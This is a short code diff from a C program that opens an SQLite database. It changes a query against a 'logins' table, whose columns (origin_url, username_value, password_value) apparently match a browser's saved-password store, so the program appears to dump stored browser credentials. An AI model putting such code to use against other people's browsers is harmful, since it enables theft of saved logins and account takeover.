@@ -189,7 +189,9 @@ int main(){
    } else {
       fprintf(stderr, "Opened database successfully\n");
    }
-    const char * sql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
+    //const char * sql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
+   //const char * sql = "SELECT name, sql FROM sqlite_master";
+   const char * sql = "SELECT * FROM logins";
    const char* data = "Callback function called";
    rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);
    if( rc != SQLITE_OK ) {
